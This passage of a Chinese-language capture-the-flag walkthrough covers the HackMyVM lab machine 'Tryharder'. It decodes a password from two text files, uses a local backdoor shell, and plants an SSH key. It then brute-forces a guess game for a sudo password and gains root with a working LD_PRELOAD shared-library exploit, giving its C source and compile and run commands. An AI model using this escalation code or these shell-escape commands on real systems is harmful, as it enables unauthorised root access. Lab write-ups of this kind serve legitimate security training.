\nnote2.txt  \n\nwww-data@Tryharder:/tmp$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /var/backups/.secret/.verysecret/.noooooo/note2.txt        \nThe Compass and the Campfire                                                                                                                                 \n\nDavid knelt beside his ten-year-old son, Jake, their shared backpack spilling onto the forest floor. \u003cspan class=\"hljs-string\"\u003e\"Lost?\"\u003c/span\u003e Jake whispered, staring at the identical trees clawing at the twilight. David’s calloused fingers brushed the cracked compass \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e his palm—a relic from his father, its needle trembling like a moth. \u003cspan class=\"hljs-string\"\u003e\"Not lost,\"\u003c/span\u003e he lied. \u003cspan class=\"hljs-string\"\u003e\"Just… rerouting.\"\u003c/span\u003e        \n                                                                                                                                                             \nJake’s eyes narrowed, too sharp \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e comfort. \u003cspan class=\"hljs-string\"\u003e\"Your compass is broken.\"\u003c/span\u003e        \n                                                                                                                                                             \nA chuckle escaped David, brittle as dry leaves. \u003cspan class=\"hljs-string\"\u003e\"Compasses don’t break, bud. They… forget.\"\u003c/span\u003e He flipped it open, the glass fogged with age. \u003cspan class=\"hljs-string\"\u003e\"See? North isn’t \nwhere it should be. It’s where it chooses to be tonight.\"\u003c/span\u003e                     \n                                                                                                                                                             \nThe boy frowned, \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e yelped as a pinecone thudded beside him. A red squirrel chattered overhead, its \u003cspan class=\"hljs-built_in\"\u003etail\u003c/span\u003e flicking like a metronome. Jake’s fear dissolved into giggles. David watched, throat tight. He’s still young enough to laugh at squirrels.                                                                     \n                                       \n\u003cspan class=\"hljs-string\"\u003e\"Dad?\"\u003c/span\u003e Jake unzipped his jacket, revealing three granola bars and a glowstick. \u003cspan class=\"hljs-string\"\u003e\"We’ve got supplies. Let’s build a fort.\"\u003c/span\u003e                                     \n                                       \nThey wove branches into a crooked shelter, Jake’s hands steady \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e David’s shook. When the first stars pierced the canopy, David confessed: \u003cspan class=\"hljs-string\"\u003e\"Grandpa gave me this compass the day I got lost in the mall. Told me it’d always point home.\"\u003c/span\u003e                                                                              \n                                       \nJake snapped the glowstick, bathing their fort \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e alien green. \u003cspan class=\"hljs-string\"\u003e\"Does it work now?\"\u003c/span\u003e                                                                           \n                                       \nThe needle quivered, settling northwest. Toward the distant highway hum, not their cabin’s woodsmoke. David closed the brass lid. \u003cspan class=\"hljs-string\"\u003e\"Nope. But you do.\"\u003c/span\u003e He nodded at Jake’s pocket—\u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e a crumpled trail map peeked out, dotted with the boy’s doodled dinosaurs.                                                          \n                                       \nDawn found them at the cabin’s porch, guided by Jake’s roars laughter and the squirrels he’d named \u003cspan class=\"hljs-string\"\u003e\"Sir Nibbles\"\u003c/span\u003e. The compass stayed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e David’s pocket, its secret safe: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e north had shifted years ago, anyway—from steel poles to a gap-toothed grin eating pancakes at 6 AM.           \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还能扫描到存在\u003ccode\u003e/srv/...\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Tryharder:/tmp$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /srv/...\nIuwbtthfbetuoftimfs\u003cspan class=\"hljs-string\"\u003e\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看着和用户\u003ccode\u003epentester\u003c/code\u003e 描述很像，稍有一些字符不一样\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eItwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness\u003cspan class=\"hljs-variable\"\u003e$itwastheepochofbelief\u003c/span\u003e,itwastheepochofincredulity,\u0026#x26;itwastheseasonofLight...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/tryharder  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e a.txt                  \nItwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness\u003cspan class=\"hljs-variable\"\u003e$itwastheepochofbelief\u003c/span\u003e,itwastheepochofincredulity,\u0026#x26;itwastheseasonofLight...\n ⚡ root@kali  ~/Desktop/test/tryharder  \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e b.txt  \nIuwbtthfbetuoftimfs\u003cspan class=\"hljs-string\"\u003e\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e像是对比字符，相同为一个结果不相同为一个结果，这样就像是二进制数了\u003c/p\u003e\n\u003cp\u003e编写脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003es1 = \u003cspan class=\"hljs-string\"\u003e\"Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness\u003cspan class=\"hljs-variable\"\u003e$itwastheepochofbelief\u003c/span\u003e,itwastheepochofincredulity,\u0026#x26;itwastheseasonofLight...\"\u003c/span\u003e\ns2 = \u003cspan class=\"hljs-string\"\u003e\"Iuwbtthfbetuoftimfs\\\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../\"\u003c/span\u003e\n\nresult = \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"0\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ch1 == ch2 \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ch1, ch2 \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e zip(s1, s2))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(result)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果为\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e0101100100110000010101010101111100110101010011010011010001010011010010000011001101000100010111110011000100110111010111110011100001010101010001000100010001011001\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将结果转换为十进制得到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eY0U_5M4SH3D_17_8UDDY\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行SSH登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  ssh pentester@192.168.56.41 \nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'192.168.56.41 (192.168.56.41)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:rXcjV9xeZG+J6KZLTr1t2Xi2ErBvMauXjxH4EBvhV0c.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:39: [hashed name]\n    ~/.ssh/known_hosts:41: [hashed name]\n    ~/.ssh/known_hosts:42: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e192.168.56.41\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\npentester@Tryharder:~$ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权 - xiix\u003c/h3\u003e\n\u003cp\u003e查看\u003ccode\u003esudo\u003c/code\u003e权限，貌似可以进行提权\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester@Tryharder:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e pentester on tryharder:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser pentester may run the following commands on tryharder:\n    (ALL : ALL) NOPASSWD: /usr/bin/find\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester@Tryharder:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e find . -\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e /bin/sh \\; -quit\nfind: critical error - Segmentation fault (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e无法拿来进行提权，估计是被修改过的，难道是要我们使用其来寻找一些文件么？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester@Tryharder:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e find /root -name \u003cspan class=\"hljs-string\"\u003e'*'\u003c/span\u003e\n/root\n/root/congrats.txt\n/root/.local\n/root/.local/share\n/root/.local/share/nano\n/root/root.txt\n/root/.profile\n/root/.bashrc\n/root/1.c\n/root/.Xauthority\n/root/.bash_history\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传\u003ccode\u003elinpeas\u003c/code\u003e进行扫描，\u003ccode\u003exiix\u003c/code\u003e运行着\u003ccode\u003e/srv/backdoor.py\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e-syslog-only                                                                                                                                                 \n  └─(Caps) 0x0000000020000000=cap_audit_write                                                                                                                \nroot       377  0.1  0.6  19304  6228 ?        Ss   22:05   0:03 /lib/systemd/systemd-logind                                                                 \nroot       381  0.0  0.2   8824  2940 ?        Ss   22:05   0:00 /usr/sbin/cron -f                                                                           \nroot       435  0.0  0.2   9796  2640 ?        S    22:06   0:00  _ /usr/sbin/CRON -f                                                                        \nxiix       436  0.0  0.0   2384   644 ?        Ss   22:06   0:00      _ /bin/sh -c /srv/backdoor.py                                                          \nxiix       437  0.0  0.8  19260  8432 ?        S    22:06   0:00          _ python /srv/backdoor.py                                                          \nroot       387  0.0  0.1   5608  1480 tty1     Ss+  22:05   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是我么没有权限查看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester@Tryharder:/srv$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al backdoor.py \n-rwx------ 1 xiix xiix 1012 Mar 23 23:42 backdoor.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看一下端口，存在一个本地访问的\u003ccode\u003e8989\u003c/code\u003e端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester@Tryharder:/srv$ ss -tulpn\nNetid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   \nudp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                      \ntcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                      \ntcp                     LISTEN                   0                        5                                              127.0.0.1:8989                                            0.0.0.0:*                      \ntcp                     LISTEN                   0                        128                                                    *:80                                                    *:*                      \ntcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问后提示输入密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester@Tryharder:/srv$ nc 127.0.0.1 8989\nEnter password: 1\nAccess denied!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试输入之前获得的密码后得到一个shell，并且权限是\u003ccode\u003exiix\u003c/code\u003e 用户的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester@Tryharder:/srv$ nc 127.0.0.1 8989\nEnter password: Y0U_5M4SH3D_17_8UDDY\nAccess granted!\nshell\u003e \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1001(xiix) gid=1001(xiix) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1001(xiix)\n\nshell\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e写入公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"xxxx\"\u003c/span\u003e \u003e .ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eSSH\u003c/code\u003e登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  ssh xiix@192.168.56.41   \nLinux Tryharder 4.19.0-12-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP Debian 4.19.152-1 (2020-10-18) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nxiix@Tryharder:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e提权 - root\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003exiix\u003c/code\u003e家目录下有一个可执行文件\u003ccode\u003eguess_game\u003c/code\u003e ，文件所属者是\u003ccode\u003exiix\u003c/code\u003e但是没有任何办法进行更改权限，估计是使用\u003ccode\u003elsattr\u003c/code\u003e 限制了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003exiix@Tryharder:~$ ./guess_game \n===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n输入你的猜测（0-99） / Your guess (0-99): ^C\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e貌似很危险..提示说有捷径，我直接执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003exiix@Tryharder:~$ ./guess_game \n===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n输入你的猜测（0-99） / Your guess (0-99): 1\n哈哈，猜错了！ / Wrong guess!\n秘密数字是 34。 / Secret number: 34\n正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)\n\nxiix@Tryharder:~$ ./guess_game \n===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n输入你的猜测（0-99） / Your guess (0-99): 2\n哈哈，猜错了！ / Wrong guess!\n秘密数字是 20。 / Secret number: 20\n正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e貌似不会做什么，并且每次数字不一样，直接暴力破解\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e $(\u003cspan class=\"hljs-built_in\"\u003eseq\u003c/span\u003e 10000);\u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e 1|./guess_game ;\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破出密码\u003ccode\u003esuperxiix\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e===== 终极运气挑战 / Ultimate Luck Challenge ====\n规则很简单： 我心里有个数字（0-99），你有一次机会猜。\nI have a number (0-99), you get one guess.\n猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！\nGuess right, I’ll give your reward; wrong? Hehe, face the consequences!\n提示： 聪明人也许能找到捷径。\nHint: Smart ones might find a shortcut.\n天哪！你居然猜对了！运气逆天啊！ / You got it! Amazing luck!\nPass: superxiix\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接 \u003ccode\u003esudo\u003c/code\u003e ，\u003ccode\u003eroot\u003c/code\u003e权限执行\u003ccode\u003ewhoami\u003c/code\u003e…\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003exiix@Tryharder:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e xiix: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e xiix on tryharder:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=LD_PRELOAD\n\nUser xiix may run the following commands on tryharder:\n    (ALL : ALL) /bin/whoami\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003exiix@Tryharder:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nroot\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将它喂给\u003ccode\u003eGPT\u003c/code\u003e：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e虽然你不能直接 \u003ccode\u003esudo chmod\u003c/code\u003e 或提权运行其他命令，但你有这个：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eenv_keep+=LD_PRELOAD\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这在某些环境中，可能会带来 \u003cstrong\u003e突破口\u003c/strong\u003e！\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e 可以在运行程序前强行加载你自定义的 \u003ccode\u003e.so\u003c/code\u003e 共享库。\u003c/li\u003e\n\u003cli\u003e如果这个库中实现了 \u003ccode\u003egetuid()\u003c/code\u003e 或其他标准函数，它就可以被优先加载、覆盖。\u003c/li\u003e\n\u003cli\u003e当你以 \u003ccode\u003esudo\u003c/code\u003e 运行 \u003ccode\u003e/bin/whoami\u003c/code\u003e，就会先加载你的库，执行你指定的恶意代码！\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path\"\u003ehttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eSave as \u003cstrong\u003e/tmp/pe.c\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;stdio.h\u003e\u003c/span\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;sys/types.h\u003e\u003c/span\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;stdlib.h\u003e\u003c/span\u003evoid _init() {\u003c/span\u003e\n    unsetenv(\u003cspan class=\"hljs-string\"\u003e\"LD_PRELOAD\"\u003c/span\u003e);\n    setgid(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n    setuid(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n    system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash\"\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThen \u003cstrong\u003ecompile it\u003c/strong\u003e using:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\n\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /tmp\ngcc -fPIC -shared -o pe.so pe.c -nostartfiles\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFinally, \u003cstrong\u003eescalate privileges\u003c/strong\u003e running\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esudoLD_PRELOAD=./pe.so \u0026#x3C;COMMAND\u003e \u003cspan class=\"hljs-comment\"\u003e#Use any command you can run with sudo\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这样就能获得\u003ccode\u003eroot\u003c/code\u003e权限了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003exiix@Tryharder:~$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles\npe.c: In \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e ‘_init’:\npe.c:7:5: warning: implicit declaration of \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]\n     setgid(0);\n     ^~~~~~\n     setenv\npe.c:8:5: warning: implicit declaration of \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]\n     setuid(0);\n     ^~~~~~\n     setenv\nxiix@Tryharder:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e LD_PRELOAD=./pe.so /bin/whoami\nroot@Tryharder:/home/xiix# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\nroot@Tryharder:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e congrats.txt \n        ____  ____  ____  ____  ____  ____  ____  ____  ____  ____  _  \n       /    \\/    \\/    \\/    \\/    \\/    \\/    \\/    \\/    \\/    \\/ \\ \n      /_______________________________________________________________\\\n      |                                                               |\n      |  *** CONGRATULATIONS! YOU\u003cspan class=\"hljs-string\"\u003e'VE CONQUERED THE TARGET RANGE! ***  |\n      |_______________________________________________________________|\n\n   YOU ARE A TRUE HACKER LEGEND!\n   The Xiixhu Tech bows to your skills!\n\n   What'\u003c/span\u003es Next?\n   - Join our elite crew!\n   - QQ Group: 660930334\n   - Welcome aboard, mastermind!\n\n   Try Harder!\n   Keep hacking, keep winning!\n\n   [ Tip: Root password is hidden \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the congrats message! Dig deeper! ]\nroot@Tryharder:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nFlag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Tryharder","date":"2025-04-12","updated":"2025-04-12","comments":true,"tags":["HackMyVM","Linux靶机","LD提权"],"categories":"靶机","description":"Tryharder. https://hackmyvm.eu/machines/machine.php?vm=Tryharder Notes：Hello Hacker! Try Harder! 前期踩点 Web 渗透 信息收集 访问 HTTP，一个静态页面，什么内容都没有 目录扫描无结果 查看一下页..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMTryharder"},"buildId":"w5CAf1BA6WXI2gBvWdfre","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>